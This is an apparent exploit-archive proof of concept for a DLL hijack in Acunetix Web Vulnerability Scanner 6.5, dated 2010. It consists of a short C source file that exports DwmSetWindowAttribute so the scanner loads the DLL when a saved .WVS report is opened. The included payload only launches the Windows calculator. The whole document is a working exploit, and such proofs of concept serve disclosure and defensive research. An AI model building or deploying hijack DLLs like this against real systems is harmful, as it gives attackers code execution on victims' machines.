// Exploit Title: Acunetix Web Vulnerability Scanner DLL Hijack
// Date: 25 Aug 2010
// Author: Kolor
// Software Link: http://www.acunetix.com/vulnerability-scanner/vulnerabilityscanner65.exe
// Version: 6.5.20100616
// Tested on: Windows 7 64bit Eng
// Vuln ext.: .WVS (saved report)

#include <windows.h>
#define DllExport __declspec (dllexport)
DllExport void DwmSetWindowAttribute() { egg(); }

int egg()
{
	system ("calc");
		exit(0);
		return 0;
}
